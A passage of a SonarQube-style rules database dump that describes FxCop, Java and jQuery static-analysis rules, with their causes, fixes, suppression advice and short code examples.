v1.1, use either the <code>System.Reflection.AssemblyKeyFileAttribute</code> or <code>System.Reflection.AssemblyKeyNameAttribute</code> attribute.\n              </li>\n              <li>\n                For the .NET Framework 2.0, use either the /keyfile or /keycontainer compiler option /KEYFILE (Specify Key or Key Pair to Sign an Assembly) or <code>/KEYCONTAINER (Specify a Key Container to Sign an Assembly)</code> linker option in C++).\n              </li>\n            </ul>\n\n              To sign your assembly with a strong name in Visual Studio\n\n\n              <li>\n                In Visual Studio, open your solution.\n              </li>\n              <li>\n                In Solution Explorer, right-click your project and then click Properties.\n              </li>\n              <li>\n                Click the Signing tab, and select the Sign the assembly check box.\n              </li>\n              <li>\n                From Choose a strong name key file, select New.\n                The Create Strong Name Key window will display.\n              </li>\n              <li>\n                In Key file name, type a name for your strong name key.\n              </li>\n              <li>\n                Choose whether to protect the key with a password, and then click OK.\n              </li>\n              <li>\n                In Solution Explorer, right-click your project and then click Build.\n              </li>\n\n\n\n\n\n              To sign your assembly with a strong name outside Visual Studio\n\n            <ul>\n              <li>\n                Use the strong name tool (Sn.exe) that is provided by the .NET Framework SDK. For more information, see Sn.exe (Strong Name Tool).\n              </li>\n            </ul>\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Only suppress a warning from this rule if the assembly is used in an environment where tampering with the contents is not a concern.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182127.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182127.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806708	1511453806709	1
289	CA1032: Implement standard exception constructors	ImplementStandardExceptionConstructors	CA1032	fxcop	<h2>Cause</h2>\n<p>\n            A type extends <code>System.Exception</code> and does not declare all the required constructors.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Exception types must implement the following constructors:\n            <ul>\n              <li>\n                public NewException()\n              </li>\n              <li>\n                public NewException(string)\n              </li>\n              <li>\n                public NewException(string, Exception)\n              </li>\n              <li>\n                protected or private NewException(SerializationInfo, StreamingContext)\n              </li>\n            </ul>\n            Failure to provide the full set of constructors can make it difficult to correctly handle exceptions. For example, the constructor that has the signature NewException(string, Exception) is used to create exceptions that are caused by other exceptions. Without this constructor you cannot create and throw an instance of your custom exception that contains an inner (nested) exception, which is what managed code should do in such a situation. The first three exception constructors are public by convention. The fourth constructor is protected in unsealed classes, and private in sealed classes. For more information, see {rule:fxcop:ImplementSerializationConstructors}\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add the missing constructors to the exception, and make sure that they have the correct accessibility.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule when the violation is caused by using a different access level for the public constructors.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182151.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182151.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806713	1511453806713	1
287	CA1039: Lists are strongly typed	ListsAreStronglyTyped	CA1039	fxcop	<h2>Cause</h2>\n<p>\n            The public or protected type implements <code>System.Collections.IList</code> but does not provide a strongly typed method for one or more of the following:\n            <ul>\n              <li>\n                IList.Item\n              </li>\n              <li>\n                IList.Add\n              </li>\n              <li>\n                IList.Contains\n              </li>\n              <li>\n                IList.IndexOf\n              </li>\n              <li>\n                IList.Insert\n              </li>\n              <li>\n                IList.Remove\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule requires <code>IList</code> implementations to provide strongly typed members so that users are not required to cast arguments to the <code>System.Object</code> type when they use the functionality that is provided by the interface. The <code>IList</code> interface is implemented by collections of objects that can be accessed by index. This rule assumes that the type that implements <code>IList</code> does this to manage a collection of instances of a type that is stronger than <code>Object</code>.\n\n\n                <code>IList</code>\n               implements the <code>System.Collections.ICollection</code> and <code>System.Collections.IEnumerable</code> interfaces. If you implement <code>IList</code>, you must provide the required strongly typed members for <code>ICollection</code>. If the objects in the collection extend <code>System.ValueType</code>, you must provide a strongly typed member for <code>GetEnumerator</code> to avoid the decrease in performance that is caused by boxing; this is not required when the objects of the collection are a reference type.\n            To comply with this rule, implement the interface members explicitly by using names in the form InterfaceName.InterfaceMemberName, such as <code>Add</code>. The explicit interface members use the data types that are declared by the interface. Implement the strongly typed members by using the interface member name, such as Add. Declare the strongly typed members as public, and declare parameters and return values to be of the strong type that is managed by the collection. The strong types replace weaker types such as <code>Object</code> and <code>Array</code> that are declared by the interface.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, explicitly implement <code>IList</code> members and provide strongly typed alternatives for the members that were noted previously. For code that correctly implements the <code>IList</code> interface and provides the required strongly typed members, see the following example.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule when you implement a new object-based collection, such as a linked list, where types that extend the new collection determine the strong type. These types should comply with this rule and expose strongly typed members.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                <code>CA1035: ICollection implementations have strongly typed members</code>\n\n\n\n\n                {rule:fxcop:EnumeratorsShouldBeStronglyTyped}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182154.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182154.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806710	1511453806711	1
288	CA1813: Avoid unsealed attributes	AvoidUnsealedAttributes	CA1813	fxcop	<h2>Cause</h2>\n<p>\n            A public type inherits from <code>System.Attribute</code>, is not abstract, and is not sealed (<code>NotInheritable</code> in Visual Basic).\n</p>\n<h2>Rule Description</h2>\n<p>\n            The .NET Framework class library provides methods for retrieving custom attributes. By default, these methods search the attribute inheritance hierarchy; for example <code>Attribute.GetCustomAttribute</code> searches for the specified attribute type, or any attribute type that extends the specified attribute type. Sealing the attribute eliminates the search through the inheritance hierarchy, and can improve performance.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, seal the attribute type or make it abstract.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule. You should do this only if you are defining an attribute hierarchy and cannot seal the attribute or make it abstract.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:DefineAccessorsForAttributeArguments}<br/>\n\n\n\n\n                {rule:fxcop:MarkAttributesWithAttributeUsage}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182267.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182267.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806712	1511453806712	1
290	CA1021: Avoid out parameters	AvoidOutParameters	CA1021	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected method in a public type has an <code>out</code> parameter.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Passing types by reference (using <code>out</code> or <code>ref</code>) requires experience with pointers, understanding how value types and reference types differ, and handling methods with multiple return values. Also, the difference between <code>out</code> and <code>ref</code> parameters is not widely understood.\n            When a reference type is passed "by reference," the method intends to use the parameter to return a different instance of the object. Passing a reference type by reference is also known as using a double pointer, pointer to a pointer, or double indirection. By using the default calling convention, which is pass "by value," a parameter that takes a reference type already receives a pointer to the object. The pointer, not the object to which it points, is passed by value. Pass by value means that the method cannot change the pointer to have it point to a new instance of the reference type. However, it can change the contents of the object to which it points. For most applications this is sufficient and yields the desired behavior.\n            If a method must return a different instance, use the return value of the method to accomplish this. See the <code>System.String</code> class for a variety of methods that operate on strings and return a new instance of a string. When this model is used, the caller must decide whether the original object is preserved.\n            Although return values are commonplace and heavily used, the correct application of <code>out</code> and <code>ref</code> parameters requires intermediate design and coding skills. Library architects who design for a general audience should not expect users to master working with <code>out</code> or <code>ref</code> parameters.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule that is caused by a value type, have the method return the object as its return value. If the method must return multiple values, redesign it to return a single instance of an object that holds the values.\n            To fix a violation of this rule that is caused by a reference type, make sure that the desired behavior is to return a new instance of the reference. If it is, the method should use its return value to do this.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule. However, this design could cause usability issues.\n</p>\n<h2>Example</h2>\n\n<h3>Description</h3>\n<p>\n                Methods that implement the Try&lt;Something&gt; pattern, such as Int32.TryParse, do not raise this violation. The following example shows a structure (value type) that implements the Int32.TryParse method.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace Samples\n{\n    public struct Point\n    {\n        private readonly int _X;\n        private readonly int _Y;\n\n        public Point(int axisX, int axisY)\n        {\n            _X = axisX;\n            _Y = axisY;\n        }\n\n        public int X\n        {\n            get { return _X; }\n        }\n\n        public int Y\n        {\n            get { return _Y; }\n        }\n\n        public override int GetHashCode()\n        {\n            return _X ^ _Y;\n        }\n\n        public override bool Equals(object obj)\n        {\n            if (!(obj is Point))\n                return false;\n\n            return Equals((Point)obj);\n        }\n\n        public bool Equals(Point other)\n        {\n            if (_X != other._X)\n                return false;\n\n            return _Y == other._Y;\n        }\n\n        public static bool operator ==(Point point1, Point point2)\n        {\n            return point1.Equals(point2);\n        }\n\n        public static bool operator !=(Point point1, Point point2)\n        {\n            return !point1.Equals(point2);\n        }\n\n        // Does not violate this rule \n        public static bool TryParse(string value, out Point result)\n        {\n            // TryParse Implementation\n            result = new Point(0,0);\n            return false;\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:DoNotPassTypesByReference}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182131.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182131.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806714	1511453806715	1
291	CA1709: Identifiers should be cased correctly	IdentifiersShouldBeCasedCorrectly	CA1709	fxcop	<h2>Cause</h2>\n<p>\n            The name of an identifier is not cased correctly.\n            - or -\n            The name of an identifier contains a two-letter acronym and the second letter is lowercase.\n            - or -\n            The name of an identifier contains an acronym of three or more uppercase letters.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.\n            By convention, parameter names use camel casing; namespace, type, and member names use Pascal casing. In a camel-cased name, the first letter is lowercase, and the first letter of any remaining words in the name is in uppercase. Examples of camel-cased names are "packetSniffer", "ioFile", and "fatalErrorCode". In a Pascal-cased name, the first letter is uppercase, and the first letter of any remaining words in the name is in uppercase. Examples of Pascal-cased names are "PacketSniffer", "IOFile", and "FatalErrorCode".\n            This rule splits the name into words based on the casing and checks any two-letter words against a list of common two-letter words, such as "In" or "My". If a match is not found, the word is assumed to be an acronym. In addition, this rule assumes it has found an acronym when the name contains either four uppercase letters in a row or three uppercase letters in a row at the end of the name.\n            By convention, two-letter acronyms use all uppercase letters, and acronyms of three or more characters use Pascal casing. The following examples use this naming convention: 'DB', 'CR', 'Cpa', and 'Ecma'. The following examples violate the convention: 'Io', 'XML', and 'DoD', and for nonparameter names, 'xp' and 'cpl'.\n            'ID' is special-cased to cause a violation of this rule. 'Id' is not an acronym but is an abbreviation for 'identification'.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Change the name so that it is cased correctly.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress this warning if you have your own naming conventions, or if the identifier represents a proper name, for example, the name of a company or a technology.\n            You can also add specific terms, abbreviations, and acronyms that to a code analysis custom dictionary. Terms specified in the custom dictionary will not cause violations of this rule. For more information, see How to: Customize the Code Analysis Dictionary\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:IdentifiersShouldDifferByMoreThanCase}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182240.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182240.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806715	1511453806716	1
292	CA1822: Mark members as static	MarkMembersAsStatic	CA1822	fxcop	<h2>Cause</h2>\n<p>\n            A member that does not access instance data is not marked as static (Shared in Visual Basic).\n</p>\n<h2>Rule Description</h2>\n<p>\n            Members that do not access instance data or call instance methods can be marked as static (Shared in Visual Basic). After you mark the methods as static, the compiler will emit nonvirtual call sites to these members. Emitting nonvirtual call sites will prevent a check at runtime for each call that makes sure that the current object pointer is non-null. This can achieve a measurable performance gain for performance-sensitive code. In some cases, the failure to access the current object instance represents a correctness issue.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Mark the member as static (or Shared in Visual Basic) or use 'this'/'Me' in the method body, if appropriate.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule for previously shipped code for which the fix would be a breaking change.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:AvoidUncalledPrivateCode}<br/>\n\n\n\n\n                {rule:fxcop:AvoidUninstantiatedInternalClasses}<br/>\n\n\n\n\n                {rule:fxcop:RemoveUnusedLocals}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms245046.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms245046.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806717	1511453806718	1
293	CA2225: Operator overloads have named alternates	OperatorOverloadsHaveNamedAlternates	CA2225	fxcop	<h2>Cause</h2>\n<p>\n            An operator overload was detected, and the expected named alternative method was not found.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Operator overloading allows the use of symbols to represent computations for a type. For example, a type that overloads the plus symbol (+) for addition would typically have an alternative member named 'Add'. The named alternative member provides access to the same functionality as the operator, and is provided for developers who program in languages that do not support overloaded operators.\n            This rule examines the operators listed in the following table.\n\n\n\n\n\n\n\n                    C#\n\n\n                    Visual Basic\n\n\n                    C++\n\n\n                    Alternate name\n\n\n\n\n                    + (binary)\n\n\n                    +\n\n\n                    + (binary)\n\n\n                    Add\n\n\n\n\n                    +=\n\n\n                    +=\n\n\n                    +=\n\n\n                    Add\n\n\n\n\n                    &amp;\n\n\n                    And\n\n\n                    &amp;\n\n\n                    BitwiseAnd\n\n\n\n\n                    &amp;=\n\n\n                    And=\n\n\n                    &amp;=\n\n\n                    BitwiseAnd\n\n\n\n\n                    |\n\n\n                    Or\n\n\n                    |\n\n\n                    BitwiseOr\n\n\n\n\n                    |=\n\n\n                    Or=\n\n\n                    |=\n\n\n                    BitwiseOr\n\n\n\n\n                    --\n\n\n                    N/A\n\n\n                    --\n\n\n                    Decrement\n\n\n\n\n                    /\n\n\n                    /\n\n\n                    /\n\n\n                    Divide\n\n\n\n\n                    /=\n\n\n                    /=\n\n\n                    /=\n\n\n                    Divide\n\n\n\n\n                    ==\n\n\n                    =\n\n\n                    ==\n\n\n                    Equals\n\n\n\n\n                    ^\n\n\n                    Xor\n\n\n                    ^\n\n\n                    Xor\n\n\n\n\n                    ^=\n\n\n                    Xor=\n\n\n                    ^=\n\n\n                    Xor\n\n\n\n\n                    &gt;\n\n\n                    &gt;\n\n\n                    &gt;\n\n\n                    Compare\n\n\n\n\n                    &gt;=\n\n\n                    &gt;=\n\n\n                    &gt;=\n\n\n                    Compare\n\n\n\n\n                    ++\n\n\n                    N/A\n\n\n                    ++\n\n\n                    Increment\n\n\n\n\n                    !=\n\n\n                    &lt;&gt;\n\n\n                    !=\n\n\n                    Equals\n\n\n\n\n                    &lt;&lt;\n\n\n                    &lt;&lt;\n\n\n                    &lt;&lt;\n\n\n                    LeftShift\n\n\n\n\n                    &lt;&lt;=\n\n\n                    &lt;&lt;=\n\n\n                    &lt;&lt;=\n\n\n                    LeftShift\n\n\n\n\n                    &lt;\n\n\n                    &lt;\n\n\n                    &lt;\n\n\n                    Compare\n\n\n\n\n                    &lt;=\n\n\n                    &lt;=\n\n\n                    &lt;=\n\n\n                    Compare\n\n\n\n\n                    &amp;&amp;\n\n\n                    N/A\n\n\n                    &amp;&amp;\n\n\n                    LogicalAnd\n\n\n\n\n                    ||\n\n\n                    N/A\n\n\n                    ||\n\n\n                    LogicalOr\n\n\n\n\n                    !\n\n\n                    N/A\n\n\n                    !\n\n\n                    LogicalNot\n\n\n\n\n                    %\n\n\n                    Mod\n\n\n                    %\n\n\n                    Mod or Remainder\n\n\n\n\n                    %=\n\n\n                    N/A\n\n\n                    %=\n\n\n                    Mod\n\n\n\n\n                    * (binary)\n\n\n                    *\n\n\n                    *\n\n\n                    Multiply\n\n\n\n\n                    *=\n\n\n                    N/A\n\n\n                    *=\n\n\n                    Multiply\n\n\n\n\n                    ~\n\n\n                    Not\n\n\n                    ~\n\n\n                    OnesComplement\n\n\n\n\n                    &gt;&gt;\n\n\n                    &gt;&gt;\n\n\n                    &gt;&gt;\n\n\n                    RightShift\n\n\n\n\n                    &gt;&gt;=\n\n\n                    N/A\n\n\n                    &gt;&gt;=\n\n\n                    RightShift\n\n\n\n\n                    - (binary)\n\n\n                    - (binary)\n\n\n                    - (binary)\n\n\n                    Subtract\n\n\n\n\n                    -=\n\n\n                    N/A\n\n\n                    -=\n\n\n                    Subtract\n\n\n\n\n                    true\n\n\n                    IsTrue\n\n\n                    N/A\n\n\n                    IsTrue (Property)\n\n\n\n\n                    - (unary)\n\n\n                    N/A\n\n\n                    -\n\n\n                    Negate\n\n\n\n\n                    + (unary)\n\n\n                    N/A\n\n\n                    +\n\n\n                    Plus\n\n\n\n\n                    false\n\n\n                    IsFalse\n\n\n                    False\n\n\n                    IsTrue (Property)\n\n\n\n\n            N/A == Cannot be overloaded in the selected language.\n            The rule also checks implicit and explicit cast operators in a type (SomeType) by checking for methods named ToSomeType and FromSomeType.\n            In C#, when a binary operator is overloaded, the corresponding assignment operator, if any, is also implicitly overloaded.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, implement the alternative method for the operator; name it using the recommended alternative name.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule if you are implementing a shared library. Applications can ignore a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:DoNotOverloadOperatorEqualsOnReferenceTypes}<br/>\n\n\n\n\n                {rule:fxcop:OperatorsShouldHaveSymmetricalOverloads}<br/>\n\n\n\n\n                {rule:fxcop:OverrideEqualsOnOverloadingOperatorEquals}<br/>\n\n\n\n\n                {rule:fxcop:OverrideGetHashCodeOnOverridingEquals}<br/>\n\n\n\n\n                {rule:fxcop:OverloadOperatorEqualsOnOverridingValueTypeEquals}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182355.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182355.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806718	1511453806719	1
439	"readObject" should not be "synchronized"	S2675	S2675	squid	<p>A <code>readObject</code> method is written when a <code>Serializable</code> object needs special handling to be rehydrated from file.\nIt should be the case that the object being created by <code>readObject</code> is only visible to the thread that invoked the method,\nand the <code>synchronized</code> keyword is not needed, and using <code>synchronized</code> anyway is just confusing.\nIf this is not the case, the method should be refactored to make it the case.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nprivate synchronized void readObject(java.io.ObjectInputStream in)\n     throws IOException, ClassNotFoundException { // Noncompliant\n  //...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nprivate void readObject(java.io.ObjectInputStream in)\n     throws IOException, ClassNotFoundException { // Compliant\n  //...\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	confusing	f	HTML	1511453806943	1511453806943	1
440	Non-constructor methods should not have the same name as the enclosing class	S1223	S1223	squid	<p>Having a class and some of its methods sharing the same name is misleading, and leaves others to wonder whether it was done that way on purpose, or was the methods supposed to be a constructor.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class Foo {\n   public Foo() {...}\n   public void Foo(String label) {...}  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Foo {\n   public Foo() {...}\n   public void foo(String label) {...}  // Compliant\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453806944	1511453806944	1
294	CA1724: Type Names Should Not Match Namespaces	TypeNamesShouldNotMatchNamespaces	CA1724	fxcop	<h2>Cause</h2>\n<p>\n            A type name matches a .NET Framework namespace names in a case-insensitive comparison.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Type names should not match the names of namespaces that are defined in the .NET Framework class library. Violating this rule can reduce the usability of the library.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Select a type name that does not match the name of a .NET Framework class library namespace.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            For new development, no known scenarios occur where you must suppress a warning from this rule. Before you suppress the warning, carefully consider how the users of your library might be confused by the matching name. For shipping libraries, you might have to suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182257.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182257.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806721	1511453806722	1
295	CA1722: Identifiers should not have incorrect prefix	IdentifiersShouldNotHaveIncorrectPrefix	CA1722	fxcop	<h2>Cause</h2>\n<p>\n            An identifier has an incorrect prefix.\n</p>\n<h2>Rule Description</h2>\n<p>\n            By convention, only certain programming elements have names that begin with a specific prefix.\n            Type names do not have a specific prefix and should not be prefixed with a 'C'. This rule reports violations for type names such as 'CMyClass' and does not report violations for type names such as 'Cache'.\n            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Remove the prefix from the identifier.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:IdentifiersShouldHaveCorrectPrefix}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182246.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182246.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806723	1511453806723	1
296	CA2135: Level 2 assemblies should not contain LinkDemands	SecurityRuleSetLevel2MethodsShouldNotBeProtectedWithLinkDemands	CA2135	fxcop	<h2>Cause</h2>\n<p>\n            A class or class member is using a <code>LinkDemand</code> in an application that is using Level 2 security.\n</p>\n<h2>Rule Description</h2>\n<p>\n            LinkDemands are deprecated in the level 2 security rule set. Instead of using LinkDemands to enforce security at just-in-time (JIT) compilation time, mark the methods, types, and fields with the <code>SecurityCriticalAttribute</code> attribute.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the <code>LinkDemand</code> and mark the type or member with the <code>SecurityCriticalAttribute</code> attribute.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd997569.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997569.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806724	1511453806724	1
473	Class names should not shadow interfaces or superclasses	S2176	S2176	squid	While it's perfectly legal to give a class the same simple name as a class in another package that it extends or interface it implements, it's confusing and could cause problems in the future. \n\n<h2>Noncompliant Code Example</h2>\n<pre>\npackage my.mypackage;\n\npublic class Foo implements a.b.Foo { // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npackage my.mypackage;\n\npublic class FooJr implements a.b.Foo {\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453806989	1511453806989	1
474	Inappropriate "Collection" calls should not be made	S2175	S2175	squid	<p>A couple <code>Collection</code> methods can be called with arguments of an incorrect type, but doing so is pointless and likely the result of using the wrong argument. This rule will raise an issue when the type of the argument to <code>List.contains</code> or <code>List.remove</code> is unrelated to the type used for the list declaration.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nList&lt;String&gt; list = new ArrayList&lt;String&gt;();\nInteger integer = Integer.valueOf(1);\n\nif (list.contains(integer)) {  // Noncompliant. Always false.\n  list.remove(integer); // Noncompliant. list.add(integer) doesn't compile, so this will always return false\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	\N	f	HTML	1511453806990	1511453806990	2
475	Short-circuit logic should be used in boolean contexts	S2178	S2178	squid	The use of non-short-circuit logic in a boolean context is likely a mistake - one that could cause serious program errors as conditions are evaluated under the wrong circumstances.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif(getTrue() | getFalse()) { ... } // Noncompliant; both sides evaluated\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif(getTrue() || getFalse()) { ... }  // true short-circuit logic\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806991	1511453806991	2
809	Selections should be stored	S2762	\N	javascript	<p>\n  jQuery doesn't cache elements for you. If you've made a selection that you might need to make again, you should save the selection in a variable rather than making the\n  selection repeatedly.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n$( "p" ).hide();\n$( "p" ).show();\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar paragraph = $( "p" );\n\nparagraph.hide();\nparagraph.show();\n</pre>\n\n<h2>Exception</h2>\n<p>\n  Stored selections are not updated when the DOM changes. Since variables may need to updated this rule ignores selections that are repeated during an assignment.\n</p>\n<pre>\nvar paragraph = $("p");\n\n// ...\n\nparagraph = $("p");\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	LINEAR_OFFSET	\N	1min	\N	2min	number of times selection is re-made.	\N	jquery,performance,user-experience	f	HTML	1511453807410	1511453807411	1
297	CA2139: Transparent methods may not use the HandleProcessCorruptingExceptions attribute	TransparentMethodsMustNotHandleProcessCorruptingExceptions	CA2139	fxcop	<h2>Cause</h2>\n<p>\n            A transparent method is marked with the <code>HandleProcessCorruptedStateExceptionsAttribute</code> attribute.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule fires any method which is transparent and attempts to handle a process corrupting exception by using the <code>HandleProcessCorruptedStateExceptionsAttribute</code> attribute. A process corrupting exception is a CLR version 4.0 exception classification of exceptions such <code>AccessViolationException</code>. The HandleProcessCorruptedStateExceptionsAttribute attribute may only be used by security critical methods, and will be ignored if it is applied to a transparent method. To handle process corrupting exceptions, this method must become security critical or security safe-critical.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the <code>HandleProcessCorruptedStateExceptionsAttribute</code> attribute, or mark the method with the <code>SecurityCriticalAttribute</code> or the <code>SecuritySafeCriticalAttribute</code> attribute.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd997565.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997565.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806724	1511453806726	1
298	CA2130: Security critical constants should be transparent	ConstantsShouldBeTransparent	CA2130	fxcop	<h2>Cause</h2>\n<p>\n            A constant field or an enumeration member is marked with the <code>SecurityCriticalAttribute</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Transparency enforcement is not enforced for constant values because compilers inline constant values so that no lookup is required at run time. Constant fields should be security transparent so that code reviewers do not assume that transparent code cannot access the constant.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the SecurityCritical attribute from the field or value.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd997446.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997446.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806727	1511453806727	1
